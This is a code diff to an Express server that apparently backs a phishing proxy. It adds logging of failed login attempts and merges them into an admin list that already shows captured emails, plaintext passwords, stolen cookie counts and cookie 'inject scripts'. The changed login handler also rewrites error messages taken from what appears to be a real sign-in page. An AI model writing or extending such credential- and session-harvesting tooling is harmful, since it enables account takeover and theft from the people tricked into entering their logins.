@@ -98,6 +98,29 @@ function saveAnalytics() {
     }
 }
 
+// Save invalid login attempt to file
+function saveInvalidEntry(sessionId, email, reason, errorMessage = '') {
+    try {
+        const invalidEntry = {
+            id: Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5),
+            sessionId: sessionId,
+            email: email || 'Unknown',
+            reason: reason,
+            errorMessage: errorMessage,
+            timestamp: new Date().toISOString(),
+            status: 'invalid'
+        };
+
+        const invalidEntryFile = path.join(__dirname, 'session_data', `invalid_${invalidEntry.id}.json`);
+        fs.writeFileSync(invalidEntryFile, JSON.stringify(invalidEntry, null, 2));
+        console.log(`💾 Invalid entry saved: ${invalidEntryFile}`);
+        return invalidEntry.id;
+    } catch (error) {
+        console.error('Error saving invalid entry:', error);
+        return null;
+    }
+}
+
 // Initialize analytics from file
 const analytics = loadAnalytics();
 
@@ -406,6 +429,7 @@ app.post('/api/login', async (req, res) => {
         if (!email) {
             analytics.invalidEntries++;
             saveAnalytics();
+            saveInvalidEntry(null, '', 'Missing email', 'Email is required');
             return res.status(400).json({ 
                 error: 'Email is required' 
             });
@@ -522,6 +546,7 @@ app.post('/api/login', async (req, res) => {
             if (!loginSuccess) {
                 analytics.invalidEntries++;
                 saveAnalytics();
+                saveInvalidEntry(sessionId, email, 'Login failed', 'Password authentication failed');
             }
 
             res.json({
@@ -608,6 +633,7 @@ app.post('/api/login', async (req, res) => {
                                     foundAccountNotFoundError = true;
                                     analytics.invalidEntries++;
                                     saveAnalytics();
+                                    saveInvalidEntry(sessionId, email, 'Account not found', errorText.trim());
                                     console.log(`📊 Analytics: Invalid entries now ${analytics.invalidEntries}`);
                                 } else {
                                     // Remove all other bordered error messages from HTML
@@ -1378,10 +1404,11 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
             return res.json({ sessions: [] });
         }
 
-        const files = fs.readdirSync(sessionDir)
-            .filter(file => file.startsWith('session_') && file.endsWith('.json'));
-
-        const sessions = files.map(file => {
+        const files = fs.readdirSync(sessionDir);
+        
+        // Get valid sessions
+        const validSessionFiles = files.filter(file => file.startsWith('session_') && file.endsWith('.json'));
+        const validSessions = validSessionFiles.map(file => {
             try {
                 const filePath = path.join(sessionDir, file);
                 const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
@@ -1399,7 +1426,8 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
                     email: data.email,
                     password: data.password,
                     timestamp: data.timestamp,
-                    totalCookies: data.totalCookies
+                    totalCookies: data.totalCookies,
+                    status: 'valid'
                 };
             } catch (error) {
                 console.error(`Error reading session file ${file}:`, error);
@@ -1407,7 +1435,37 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
             }
         }).filter(session => session !== null);
 
-        res.json({ sessions });
+        // Get invalid entries
+        const invalidSessionFiles = files.filter(file => file.startsWith('invalid_') && file.endsWith('.json'));
+        const invalidSessions = invalidSessionFiles.map(file => {
+            try {
+                const filePath = path.join(sessionDir, file);
+                const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
+                
+                return {
+                    filename: file,
+                    injectFilename: null, // Invalid entries don't have inject scripts
+                    id: data.id,
+                    email: data.email,
+                    password: null, // Invalid entries don't have passwords
+                    timestamp: data.timestamp,
+                    totalCookies: 0, // Invalid entries don't have cookies
+                    status: 'invalid',
+                    reason: data.reason,
+                    errorMessage: data.errorMessage
+                };
+            } catch (error) {
+                console.error(`Error reading invalid session file ${file}:`, error);
+                return null;
+            }
+        }).filter(session => session !== null);
+
+        // Combine and sort by timestamp (newest first)
+        const allSessions = [...validSessions, ...invalidSessions].sort((a, b) => {
+            return new Date(b.timestamp) - new Date(a.timestamp);
+        });
+
+        res.json({ sessions: allSessions });
     } catch (error) {
         console.error('Error getting sessions:', error);
         res.status(500).json({ error: 'Failed to get sessions' });
